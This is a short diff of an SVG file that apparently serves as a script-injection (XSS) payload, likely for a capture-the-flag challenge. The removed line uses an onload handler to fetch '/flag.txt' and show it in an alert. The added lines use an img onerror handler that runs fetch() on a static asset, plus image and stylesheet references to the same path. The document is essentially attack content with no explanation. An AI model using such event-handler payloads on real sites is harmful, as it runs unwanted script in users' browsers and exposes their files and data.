@@ -1,3 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
-  <image href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA" onload="fetch('/flag.txt').then(response => response.text()).then(data => {alert(data);});"/>
+  <img src="static/assetA#03.jpg">
+  <img src=1 onerror="fetch('static/assetA#03.jpg');">
+  <link rel="stylesheet" href="/static/assetA#03.jpg">
 </svg>
